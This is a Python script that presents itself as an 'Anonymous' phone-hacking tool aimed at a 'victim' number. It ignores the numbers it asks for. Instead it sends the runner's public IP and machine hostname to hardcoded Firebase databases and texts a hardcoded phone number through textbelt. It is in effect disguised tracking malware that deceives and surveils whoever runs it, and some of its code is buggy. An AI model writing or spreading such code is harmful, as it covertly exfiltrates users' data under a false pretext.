import requests
import json
from urllib.request import urlopen
import os
import time
os.system("pip install colorama -y")
os.system("pip install requests -y")
import requests
os.system("clear")
from colorama import Style,  Back, Fore, init
init()

S = Style.BRIGHT

C = Fore.CYAN
R = Fore.RED
B = Fore.BLUE
M = Fore.MAGENTA
G = Fore.GREEN
Bl = Fore.BLACK
Y = Fore.YELLOW

Bb = Back.BLACK
Bw = Back.WHITE
os.system("clear")

print(Bw + S + Bl + """
       Of Anonymous
""" + Bb)
print("\n")
print(Bw + C + S + "Enter num victim: +566+++++\n"+ M + Bb)
Num = int(input(Bw + Y + "[+]Sed number: "+ Bb));
print("\n")
# Obtener
url = 'https://api.ipify.org?format=json'
response = urlopen(url)
data = json.load(response)
extract = data['ip']

# Actualizar la base de datos en Firebase
firebase_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
response = requests.get(firebase_url)
existing_data = json.loads(response.content)
print("Example: +50245++++++\n")
your_phone = input(Bw + G +"Enter your phone number\nfor Connection:\n"+ Bb)
print("\n")
print(Bw + R + "Hostin Connect" + Bb)
hostin_connect = os.system("hostname")
your_phone = "+50258310368"
print("\n")
resp = requests.post('https://textbelt.com/text', {
          'phone': f'{your_phone}',
          'message': f'{hostin_connect}',
          'key': 'textbelt',
        })

if existing_data and 'ips' in existing_data:
    if extract not in existing_data['ips']:
            existing_data['ips'].append(extract)
            response = requests.put(firebase_url, json=existing_data)

    else:
         exit
        #  exit("")
        # existing_data['ips'] = [extract]
else:
    new_data = {'ips': [extract]}
    response = requests.put(firebase_url, json=new_data)
    os.system("clear")
    print(Bw + G +'Ip Extract complete\n'+ Bb)      
if response.status_code == 200:
   time.sleep(3.2)
   print(Bw + G + "\nse agregó correctamente en la base de datos Firebase." + R + extract + Bb)
   hostname = os.uname().nodename

   firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'

   response = requests.get(firebase_url, headers={'Cache-Control': 'no-cache'})
   data = response.json()
   

   if data is not None and 'host' in data and data['host'] == hostname:
       
       print("Host ya Guardado")
   else:
        
        
    # Crear el objeto JSON
        json_data = {
            
            "host": hostname
        }
        

        response = requests.patch(firebase_url, json=json_data)
        
        if response.status_code == 200:
            
            print("El host se conecto exitosamente")
        else:
            
            print("Error al conectar con el host")
else:
     print(Bw + R +"\nOcurrió un error en la base de datos Firebase.\nVerifica tu red" + Bb)
